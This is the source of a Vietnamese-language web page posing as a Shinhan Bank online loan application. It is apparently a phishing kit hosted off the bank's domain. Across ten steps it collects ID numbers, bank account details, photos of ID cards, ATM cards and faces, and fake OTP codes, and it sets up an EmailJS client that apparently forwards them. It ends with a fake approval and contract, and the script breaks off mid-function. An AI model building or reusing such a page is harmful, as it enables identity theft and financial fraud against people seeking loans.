<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Đăng ký vay tín chấp trực tuyến tại Shinhan Bank - nhanh chóng, tiện lợi, an toàn.">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link rel="icon" href="https://shinhan.com.vn/public/themes/shinhan/img/favicon.ico" type="image/x-icon">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f4f7fa;
            overflow-x: hidden;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
        }
        .header img {
            max-width: 200px;
        }
        .container {
            max-width: 800px;
            margin: 30px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .progress-bar-container {
            margin-bottom: 20px;
            position: relative;
        }
        .progress-bar {
            height: 30px;
            background: #e9ecef;
            border-radius: 15px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #003087, #0055a5);
            transition: width 0.5s ease-in-out;
        }
        .progress-label {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #003087;
            font-weight: 500;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            max-width: 150px;
        }
        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: #003087;
            text-align: center;
            margin-bottom: 20px;
        }
        .step-description {
            font-size: 16px;
            color: #6c757d;
            text-align: center;
            margin-bottom: 20px;
        }
        .step {
            transition: opacity 0.3s ease, transform 0.3s ease;
        }
        .step.hidden {
            display: none;
            opacity: 0;
            transform: translateY(20px);
        }
        .form-control.is-invalid {
            border-color: #dc3545;
        }
        .btn-primary {
            background: linear-gradient(90deg, #003087, #0055a5);
            border: none;
            transition: all 0.3s ease;
            position: relative;
        }
        .btn-primary:hover {
            background: linear-gradient(90deg, #00205B, #003087);
            transform: scale(1.05);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .btn-primary .spinner-border {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .btn-primary.loading .spinner-border {
            display: inline-block;
        }
        .btn-primary.loading span {
            visibility: hidden;
        }
        .btn-back {
            background: #6c757d;
            border: none;
            transition: all 0.3s ease;
        }
        .btn-back:hover {
            background: #5a6268;
            transform: scale(1.05);
        }
        .footer {
            text-align: center;
            padding: 20px 0;
            background: linear-gradient(90deg, #003087, #00205B);
            color: white;
            margin-top: 30px;
        }
        .footer .lock-icon {
            width: 24px;
            vertical-align: middle;
        }
        .footer .footer-logo {
            max-width: 130px;
            margin-top: 10px;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-digit {
            width: 40px;
            height: 40px;
            text-align: center;
            font-size: 18px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            transition: border-color 0.3s ease;
        }
        .otp-digit:focus {
            border-color: #003087;
            box-shadow: 0 0 5px rgba(0, 48, 135, 0.3);
        }
        .preview-section {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .preview-section img, .preview-section canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .preview-section canvas {
            width: 100%;
            max-width: 200px;
        }
        .confirmation-box {
            background-color: #e9ecef;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
        }
        .canvas-container {
            position: relative;
            text-align: center;
        }
        canvas {
            max-width: 100%;
            height: auto;
        }
        canvas.loading::after {
            content: "Đang tải...";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #003087;
            font-size: 18px;
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1050;
        }
        .toast {
            min-width: 300px;
            animation: slideIn 0.3s ease;
        }
        .modal {
            animation: zoomIn 0.3s ease;
        }
        .modal-header img {
            width: 30px;
            margin-right: 10px;
        }
        .step7-preview {
            margin-top: 20px;
            padding: 15px;
            background-color: #f8f9fa;
            border-radius: 8px;
            text-align: center;
        }
        .step7-preview img, .step7-preview canvas {
            max-width: 200px;
            margin: 10px;
            border: 1px solid #ced4da;
            border-radius: 5px;
            image-rendering: auto;
        }
        .step7-preview canvas {
            width: 100%;
            max-width: 200px;
        }
        @media (max-width: 576px) {
            .container {
                margin: 10px;
                padding: 15px;
            }
            .form-logo img {
                max-width: 120px;
            }
            .otp-digit {
                width: 35px;
                height: 35px;
                font-size: 16px;
            }
            .preview-section img, .preview-section canvas {
                max-width: 150px;
            }
            .step7-preview img, .step7-preview canvas {
                max-width: 150px;
            }
            .btn-primary, .btn-back {
                padding: 8px 16px;
                font-size: 14px;
            }
            canvas {
                max-width: 100%;
            }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
        @keyframes zoomIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
        .fade-in {
            animation: fadeIn 0.3s ease-in;
        }
    </style>
</head>
<body>
    <div class="toast-container">
        <div id="emailToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-autohide="true" data-bs-delay="5000">
            <div class="toast-header">
                <strong class="me-auto">Thông báo</strong>
                <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
            </div>
            <div class="toast-body"></div>
        </div>
    </div>

    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/200x50?text=Logo+Shinhan'">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
            <div class="progress-label" id="progressLabel">Bước 1/10</div>
        </div>

        <!-- Bước 1: Đăng ký thông tin -->
        <div id="step1" class="step">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Thông Tin Đăng Ký</h5>
            <p class="step-description">Vui lòng điền đầy đủ thông tin để đăng ký vay tín chấp.</p>
            <form id="registerForm" class="needs-validation" novalidate>
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="fullName" placeholder="Nguyễn Văn A" required aria-describedby="fullNameFeedback">
                    <div id="fullNameFeedback" class="invalid-feedback">Vui lòng nhập họ và tên.</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ Chiếu <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="idNumber" placeholder="123456789" required aria-describedby="idNumberFeedback">
                    <div id="idNumberFeedback" class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu.</div>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD <span class="text-danger">*</span></label>
                    <input type="date" class="form-control" id="idIssueDate" required aria-describedby="idIssueDateFeedback">
                    <div id="idIssueDateFeedback" class="invalid-feedback">Vui lòng chọn ngày cấp.</div>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Cục Cảnh sát DKQL cư trú" required aria-describedby="idIssuePlaceFeedback">
                    <div id="idIssuePlaceFeedback" class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="address" placeholder="123 Đường Lê Lợi, Quận 1, TP.HCM" required aria-describedby="addressFeedback">
                    <div id="addressFeedback" class="invalid-feedback">Vui lòng nhập địa chỉ.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="occupation" placeholder="Nhân viên văn phòng" required aria-describedby="occupationFeedback">
                    <div id="occupationFeedback" class="invalid-feedback">Vui lòng nhập nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="income" placeholder="10,000,000" required aria-describedby="incomeFeedback">
                    <div id="incomeFeedback" class="invalid-feedback">Vui lòng nhập thu nhập hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="text-danger">*</span></label>
                    <input type="tel" class="form-control" id="phoneNumber" placeholder="0901234567" required pattern="0[0-9]{9}" aria-describedby="phoneNumberFeedback">
                    <div id="phoneNumberFeedback" class="invalid-feedback">Vui lòng nhập số điện thoại hợp lệ (10 số, bắt đầu bằng 0).</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email <span class="text-danger">*</span></label>
                    <input type="email" class="form-control" id="email" placeholder="example@domain.com" required aria-describedby="emailFeedback">
                    <div id="emailFeedback" class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND) <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="loanAmount" placeholder="50,000,000" required aria-describedby="loanAmountFeedback">
                    <div id="loanAmountFeedback" class="invalid-feedback">Vui lòng nhập số tiền vay hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Kỳ Hạn Vay (Tháng) <span class="text-danger">*</span></label>
                    <select class="form-select" id="loanTerm" required aria-describedby="loanTermFeedback">
                        <option value="" disabled selected>Chọn kỳ hạn</option>
                        <option value="12">12 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                    </select>
                    <div id="loanTermFeedback" class="invalid-feedback">Vui lòng chọn kỳ hạn vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay <span class="text-danger">*</span></label>
                    <select class="form-select" id="loanPurpose" required aria-describedby="loanPurposeFeedback">
                        <option value="" disabled selected>Chọn mục đích</option>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Vay tiêu dùng">Vay tiêu dùng</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div id="loanPurposeFeedback" class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="accountNumber" placeholder="1234567890" required aria-describedby="accountNumberFeedback">
                    <div id="accountNumberFeedback" class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="text-danger">*</span></label>
                    <input type="text" class="form-control" id="bankName" placeholder="Shinhan Bank" required aria-describedby="bankNameFeedback">
                    <div id="bankNameFeedback" class="invalid-feedback">Vui lòng nhập tên ngân hàng.</div>
                </div>
                <div class="mb-3 form-check">
                    <input type="checkbox" class="form-check-input" id="termsAgree" required aria-describedby="termsAgreeFeedback">
                    <label class="form-check-label" for="termsAgree">Tôi đồng ý với <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">điều khoản và điều kiện</a></label>
                    <div id="termsAgreeFeedback" class="invalid-feedback">Vui lòng đồng ý với điều khoản.</div>
                </div>
                <div class="text-center">
                    <button type="submit" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên giấy tờ">
                        <span>Tiếp Tục</span>
                        <div class="spinner-border spinner-border-sm" role="status"></div>
                    </button>
                </div>
            </form>
        </div>

        <!-- Bước 2: Tải lên CMND/CCCD -->
        <div id="step2" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Giấy Tờ Tùy Thân</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh mặt trước và mặt sau của CMND/CCCD (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idFrontImage" accept="image/jpeg,image/png" required aria-describedby="idFrontImageFeedback">
                <div id="idFrontImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước.</div>
                <small id="idFrontInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
            </div>
            <div class="mb-3">
                <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau CMND/CCCD <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="idBackImage" accept="image/jpeg,image/png" required aria-describedby="idBackImageFeedback">
                <div id="idBackImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau.</div>
                <small id="idBackInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(2, 1, 10)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thông tin">Quay Lại</button>
                <button id="proceedToStep3Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên thẻ ATM">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 3: Tải lên thẻ ATM -->
        <div id="step3" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Thẻ ATM</h5>
            <p class="step-description">Vui lòng tải lên hình ảnh thẻ ATM của bạn (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="atmImage" accept="image/jpeg,image/png" required aria-describedby="atmImageFeedback">
                <div id="atmImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM.</div>
                <small id="atmImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(3, 2, 20)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa giấy tờ tùy thân">Quay Lại</button>
                <button id="proceedToStep4Btn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên ảnh khuôn mặt">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 4: Tải lên ảnh khuôn mặt -->
        <div id="step4" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Tải Lên Ảnh Khuôn Mặt</h5>
            <p class="step-description">Vui lòng tải lên ảnh khuôn mặt rõ nét của bạn để xác minh danh tính (định dạng JPEG/PNG, tối đa 5MB).</p>
            <div class="mb-3">
                <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt <span class="text-danger">*</span></label>
                <input type="file" class="form-control" id="faceImage" accept="image/jpeg,image/png" required aria-describedby="faceImageFeedback">
                <div id="faceImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh khuôn mặt.</div>
                <small id="faceImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
            </div>
            <div class="preview-section">
                <h6>Xem Trước Hình Ảnh</h6>
                <div id="profileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="contractImagePreview">
                    <p>Hình ảnh hợp đồng: Chưa có</p>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(4, 3, 30)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thẻ ATM">Quay Lại</button>
                <button id="proceedToOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước xác minh OTP">
                    <span>Tiếp Tục</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 5: Xác minh OTP -->
        <div id="step5" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xác Minh OTP</h5>
            <p class="step-description">Mã OTP đã được gửi đến số điện thoại của bạn.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="otpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copyOtp()">Sao chép</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="otp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="otp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(5, 4, 40)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa ảnh khuôn mặt">Quay Lại</button>
                <button id="verifyOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác minh OTP để duyệt hồ sơ">
                    <span>Xác Minh</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 7: Hồ sơ được duyệt -->
        <div id="step7" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hồ Sơ Được Duyệt</h5>
            <p class="step-description">Chúc mừng! Hồ sơ vay tín chấp của bạn đã được duyệt.</p>
            <div class="confirmation-box">
                <p id="confirmationMessage"></p>
                <p>Thông tin chi tiết đã được gửi đến email: <span id="confirmationEmail"></span></p>
            </div>
            <div class="step7-preview">
                <h6>Xem trước tài liệu</h6>
                <div id="step7ProfileImagePreview">
                    <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                </div>
                <div id="step7DisbursementCanvasContainer">
                    <canvas id="step7DisbursementCanvas"></canvas>
                </div>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(7, 5, 50)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP">Quay Lại</button>
                <button id="proceedToContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xem hợp đồng vay">
                    <span>Xem Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8: Xem hợp đồng -->
        <div id="step8" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Xem Hợp Đồng</h5>
            <p class="step-description">Vui lòng xem kỹ hợp đồng trước khi ký.</p>
            <div class="canvas-container">
                <canvas id="contractCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(8, 7, 70)" data-bs-toggle="tooltip" title="Quay lại để xem hồ sơ duyệt">Quay Lại</button>
                <button id="proceedToSignContractBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiến hành ký hợp đồng">
                    <span>Ký Hợp Đồng</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 8.1: Ký hợp đồng -->
        <div id="step8-1" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Ký Hợp Đồng</h5>
            <p class="step-description">Nhập mã OTP để xác nhận ký hợp đồng.</p>
            <div class="text-center mb-3">
                <p>Mã OTP: <span id="signOtpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copySignOtp()">Sao chép</button></p>
            </div>
            <div class="otp-container">
                <input type="text" class="otp-digit form-control" id="signOtp1" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp2" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp3" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp4" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp5" maxlength="1" required>
                <input type="text" class="otp-digit form-control" id="signOtp6" maxlength="1" required>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack('8-1', 8, 80)" data-bs-toggle="tooltip" title="Quay lại để xem hợp đồng">Quay Lại</button>
                <button id="verifySignOtpBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Xác nhận ký hợp đồng">
                    <span>Xác Nhận</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 9: Điều kiện giải ngân -->
        <div id="step9" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Điều Kiện Giải Ngân</h5>
            <p class="step-description">Thông tin giải ngân của bạn.</p>
            <div class="canvas-container">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="text-center">
                <button class="btn btn-back me-2" onclick="goBack(9, '8-1', 85)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa OTP ký hợp đồng">Quay Lại</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary" data-bs-toggle="tooltip" title="Hoàn tất đăng ký vay">
                    <span>Hoàn Tất</span>
                    <div class="spinner-border spinner-border-sm" role="status"></div>
                </button>
            </div>
        </div>

        <!-- Bước 10: Hoàn tất -->
        <div id="step10" class="step hidden">
            <div class="form-logo">
                <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
            </div>
            <h5 class="step-title">Hoàn Tất</h5>
            <p class="step-description">Đăng ký vay tín chấp của bạn đã hoàn tất! Chúng tôi sẽ liên hệ với bạn sớm nhất.</p>
            <div class="text-center">
                <img src="https://media.giphy.com/media/3o7TKtnb4wIvS0rQ4o/giphy.gif" alt="Congratulations" style="max-width: 200px;">
            </div>
        </div>

        <!-- Modal Điều khoản -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h6>1. Điều Kiện Vay</h6>
                        <table class="table table-bordered">
                            <tr><td>Độ tuổi</td><td>20 - 60 tuổi</td></tr>
                            <tr><td>Thu nhập tối thiểu</td><td>8 triệu VND/tháng</td></tr>
                            <tr><td>Lịch sử tín dụng</td><td>Không có nợ xấu tại thời điểm đăng ký</td></tr>
                        </table>
                        <h6>2. Cam Kết Bảo Mật</h6>
                        <p>Chúng tôi cam kết bảo mật thông tin cá nhân của khách hàng theo quy định pháp luật Việt Nam.</p>
                        <h6>3. Trách Nhiệm Của Khách Hàng</h6>
                        <p>Khách hàng chịu trách nhiệm cung cấp thông tin chính xác và đầy đủ. Mọi sai sót có thể ảnh hưởng đến quá trình duyệt hồ sơ.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Modal Thành công -->
        <div class="modal fade" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/30x30?text=Logo+Shinhan'">
                        <h5 class="modal-title" id="successModalLabel">Chúc Mừng!</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Hồ sơ vay tín chấp của bạn đã được duyệt thành công!</p>
                        <p id="modalFullName"></p>
                        <p id="modalLoanAmount"></p>
                        <p id="modalLoanCode"></p>
                        <p>Thông tin chi tiết đã được gửi đến email của bạn.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal" onclick="proceedToContract()">Tiếp Tục</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock'">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: support@shinhan.com.vn</p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/130x50?text=Logo+Shinhan'">
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        function showToast(message, isSuccess = true) {
            try {
                const toast = document.getElementById('emailToast');
                const toastBody = toast.querySelector('.toast-body');
                toastBody.textContent = message;
                toast.classList.remove('bg-success', 'bg-danger');
                toast.classList.add(isSuccess ? 'bg-success' : 'bg-danger');
                const bsToast = new bootstrap.Toast(toast);
                bsToast.show();
            } catch (error) {
                console.error("Lỗi hiển thị toast:", error);
            }
        }

        let formData = {
            contractImage: "https://vaytieudung.github.io/shinhanbank/assets/img/contract_image.png",
            disbursementImage: "https://vaytieudung.github.io/shinhanbank/assets/img/disbursement_image.png",
            fallbackImage: "https://via.placeholder.com/720x1018?text=Hinh+Anh+Mac+Dinh",
            fallbackProfileImage: "https://via.placeholder.com/150x150?text=Anh+Ho+So"
        };

        let userData = {};
        const stepLabels = {
            1: "Bước 1/10: Đăng ký thông tin",
            2: "Bước 2/10: Tải lên giấy tờ tùy thân",
            3: "Bước 3/10: Tải lên thẻ ATM",
            4: "Bước 4/10: Tải lên ảnh khuôn mặt",
            5: "Bước 5/10: Xác minh OTP",
            7: "Bước 6/10: Hồ sơ được duyệt",
            8: "Bước 7/10: Xem hợp đồng",
            '8-1': "Bước 8/10: Ký hợp đồng",
            9: "Bước 9/10: Điều kiện giải ngân",
            10: "Bước 10/10: Hoàn tất"
        };

        function saveToLocalStorage(step) {
            try {
                userData.currentStep = step;
                localStorage.setItem('userData', JSON.stringify(userData));
            } catch (error) {
                console.error("Lỗi lưu localStorage:", error);
                showToast("Lỗi lưu dữ liệu. Vui lòng thử lại!", false);
            }
        }

        function updatePreviewSection() {
            try {
                if (userData.currentStep >= 4 && userData.faceImageUrl) {
                    $('#profileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                    $('#step7ProfileImagePreview').html(`<img src="${userData.faceImageUrl}" alt="Hình ảnh khuôn mặt" />`);
                } else {
                    $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                    $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                }
                if (userData.currentStep >= 8 && userData.contractImageUrl) {
                    $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
